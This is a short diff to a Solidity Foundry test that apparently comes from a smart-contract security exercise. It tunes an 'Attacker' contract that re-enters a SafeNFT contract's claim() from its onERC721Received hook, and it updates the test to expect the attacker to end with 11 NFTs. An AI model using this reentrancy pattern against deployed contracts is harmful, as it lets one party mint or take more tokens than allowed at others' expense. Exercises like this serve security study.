@@ -45,7 +45,7 @@ contract Attacker is IERC721Receiver{
     uint256 tokenId,
     bytes calldata data) public returns(bytes4){
 
-        if (reentrancyCount < 11) {
+        if (reentrancyCount < 10) {
         reentrancyCount++;
         safeNFTContract.claim();
     }
@@ -75,7 +75,7 @@ contract TestSafeNFT is Test{
         vm.prank(address(attackerContract));
         attackerContract.attackSafeNFT{value : 0.01 ether}();
 
-        assertEq(safeNFTContract.balanceOf(address(attackerContract)),1);
+        assertEq(11,safeNFTContract.balanceOf(address(attackerContract)));
 
     }
 
